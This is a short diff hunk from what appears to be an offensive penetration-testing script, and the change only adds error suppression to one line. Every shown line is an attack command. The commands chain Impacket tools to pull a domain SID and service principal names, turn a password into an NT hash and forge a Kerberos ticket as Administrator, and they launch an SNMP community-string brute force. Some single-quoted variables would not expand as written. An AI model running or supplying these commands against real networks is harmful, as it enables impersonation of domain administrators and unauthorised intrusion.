@@ -357,7 +357,7 @@ TICKET_SID=$(impacket-getPac '$DOM'/'$USERNAME':'$PASSWORD' -targetUser 'Adminis
 TICKET_SPN=$(impacket-GetUserSPNs -dc-ip $TARGET '$DOM'/'$USERNAME':'$PASSWORD' -request | awk '{print $1}' | grep -vE 'Impacket|\$krb5|Service|----|^$|\[' | cut -d '/' -f 1)
 TICKET_NTLM=$(echo -n '$PASSWORD' | iconv -t UTF-16LE | openssl dgst -md4 | cut -d ' ' -f 2 | sed 's/.*/\U&/')
 echo "$TICKET_SID\n$TICKET_SPN\n$TICKET_NTLM"
-impacket-ticketer -domain '$DOM' -domain-sid "$TICKET_SID" -nthash "$TICKET_NTLM" -spn "$TICKET_SPN/$DOM" Administrator
+impacket-ticketer -domain '$DOM' -domain-sid "$TICKET_SID" -nthash "$TICKET_NTLM" -spn "$TICKET_SPN/$DOM" Administrator 2>/dev/null
 
 [*] (161) SNMP
 (onesixtyone $TARGET -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt -w 5 -o SNMPsmall.onesixtyone &)
